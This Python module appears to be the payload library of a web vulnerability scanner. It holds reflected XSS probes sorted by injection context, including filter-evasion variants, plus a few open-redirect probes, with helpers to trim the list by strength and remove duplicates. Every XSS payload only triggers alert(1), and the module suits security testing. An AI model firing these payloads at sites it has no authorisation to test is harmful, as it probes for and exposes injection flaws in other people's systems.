from typing import Dict, List

Payload = Dict[str, str]

STRENGTH_LIMIT = {
    "LOW": 3,
    "MEDIUM": 6,
    "HIGH": 12,
    "INSANE": 100,
}

# Attribute value breakout probes.
ATTR_VALUE: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "dq_img_onerror", "payload": "\"><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "sq_img_onerror", "payload": "'><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "dq_svg_onload", "payload": "\"><svg/onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "dq_mouseover", "payload": "\" onmouseover=alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "sq_mouseover", "payload": "' onmouseover=alert(1) x='"},
    {"type": "REFLECTED_XSS", "family": "dq_onfocus", "payload": "\" autofocus onfocus=alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "dq_pointerover", "payload": "\" onpointerover=alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "dq_details_toggle", "payload": "\"><details open ontoggle=alert(1)>x</details>"},
    {"type": "REFLECTED_XSS", "family": "dq_input_focus", "payload": "\"><input autofocus onfocus=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "dq_img_backtick", "payload": "\"><img src=x onerror=alert`1`>"},
    {"type": "REFLECTED_XSS", "family": "dq_entity_equals", "payload": "\" onmouseover&#61;alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "dq_hex_equals", "payload": "\" onerror&#x3d;alert(1) x=\""},
]

# URL-bearing attribute probes.
ATTR_HREF: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "javascript_uri", "payload": "javascript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "javascript_entity_colon", "payload": "javascript&#58;alert(1)"},
    {"type": "REFLECTED_XSS", "family": "data_html", "payload": "data:text/html,<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "attr_break_mouseover", "payload": "\" onmouseover=alert(1) href=\"#"},
    {"type": "REFLECTED_XSS", "family": "attr_break_onfocus", "payload": "\" autofocus onfocus=alert(1) href=\"#"},
    {"type": "REFLECTED_XSS", "family": "src_break_onerror", "payload": "\" src=x onerror=alert(1) x=\""},
]

# Script string probes.
SCRIPT_CONTEXT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "break_dq", "payload": "\";alert(1);//"},
    {"type": "REFLECTED_XSS", "family": "break_sq", "payload": "';alert(1);//"},
    {"type": "REFLECTED_XSS", "family": "close_script", "payload": "</script><script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "newline_break", "payload": "\nalert(1)//"},
    {"type": "REFLECTED_XSS", "family": "template_break", "payload": "`;alert(1)//"},
]

# HTML comment probes.
HTML_COMMENT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "comment_img", "payload": "--><img src=x onerror=alert(1)><!--"},
    {"type": "REFLECTED_XSS", "family": "comment_svg", "payload": "--><svg onload=alert(1)><!--"},
    {"type": "REFLECTED_XSS", "family": "comment_script", "payload": "--><script>alert(1)</script><!--"},
]

# HTML body probes.
BODY: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "img_onerror", "payload": "<img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "svg_onload", "payload": "<svg/onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>x</details>"},
    {"type": "REFLECTED_XSS", "family": "input_autofocus", "payload": "<input autofocus onfocus=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "video_source_error", "payload": "<video><source onerror=alert(1)></video>"},
    {"type": "REFLECTED_XSS", "family": "marquee_start", "payload": "<marquee onstart=alert(1)>x</marquee>"},
    {"type": "REFLECTED_XSS", "family": "img_backtick", "payload": "<img src=x onerror=alert`1`>"},
    {"type": "REFLECTED_XSS", "family": "body_onload", "payload": "<body onload=alert(1)>"},
]

# Filters that strip common punctuation.
FILTERED_ATTR: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "backtick_img", "payload": "\"><img src=x onerror=alert`1`>"},
    {"type": "REFLECTED_XSS", "family": "backtick_attr", "payload": "\" onmouseover=alert`1` x=\""},
    {"type": "REFLECTED_XSS", "family": "entity_equals", "payload": "\" onmouseover&#61;alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "hex_equals", "payload": "\" onerror&#x3d;alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "svg_breakout", "payload": "\"><svg/onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "details_breakout", "payload": "\"><details open ontoggle=alert(1)>x</details>"},
    {"type": "REFLECTED_XSS", "family": "input_focus", "payload": "\"><input autofocus onfocus=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "plain_mouseover", "payload": "\" onmouseover=alert(1) x=\""},
]

# Redirect-like URL parameter probes.
URL_REDIRECT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "url_script", "payload": "<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "url_img_onerror", "payload": "<img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "url_svg_onload", "payload": "<svg/onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "url_attr_break", "payload": "\"><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "url_mouseover", "payload": "\" onmouseover=alert(1) x=\""},
    {"type": "OPEN_REDIRECT", "family": "scheme_relative", "payload": "//example.com"},
    {"type": "OPEN_REDIRECT", "family": "encoded_scheme_relative", "payload": "%2f%2fexample.com"},
    {"type": "OPEN_REDIRECT", "family": "external_https", "payload": "https://example.com/"},
]


def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
    return payloads[: STRENGTH_LIMIT.get(strength.upper(), STRENGTH_LIMIT["MEDIUM"])]


def _dedupe(groups: List[List[Payload]]) -> List[Payload]:
    seen = set()
    result: List[Payload] = []
    for payloads in groups:
        for item in payloads:
            key = item["payload"]
            if key in seen:
                continue
            seen.add(key)
            result.append(item)
    return result


CONTEXT_MAP: Dict[str, List[Payload]] = {
    "attr_value": ATTR_VALUE,
    "attr_href": ATTR_HREF,
    "script": SCRIPT_CONTEXT,
    "html_comment": HTML_COMMENT,
    "body": BODY,
    "stx_filtered": FILTERED_ATTR,
    "url_redirect": URL_REDIRECT,
    "unknown": _dedupe([BODY, ATTR_VALUE, ATTR_HREF, SCRIPT_CONTEXT, HTML_COMMENT]),
    "none": [],
}


def get_by_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
    payloads = CONTEXT_MAP.get(context.lower(), BODY)
    return _limit(payloads, strength)


def get_all() -> List[Payload]:
    return _dedupe([
        ATTR_VALUE,
        ATTR_HREF,
        SCRIPT_CONTEXT,
        HTML_COMMENT,
        BODY,
        FILTERED_ATTR,
        URL_REDIRECT,
    ])
